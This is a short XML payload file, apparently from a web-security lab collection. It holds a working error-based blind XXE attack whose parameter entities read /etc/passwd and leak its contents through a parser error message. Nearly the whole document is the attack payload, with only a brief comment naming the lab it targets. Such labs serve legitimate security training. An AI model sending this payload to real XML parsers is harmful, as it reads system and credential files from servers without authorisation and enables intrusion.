<!--
Payload: Error-based Blind XXE
Usage: Retrieving data via error messages (e.g., when the parser fails to load a non-existent file).
Lab: Blind XXE to retrieve data via error messages
Note: This relies on an external DTD that triggers an error containing the file contents.
-->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
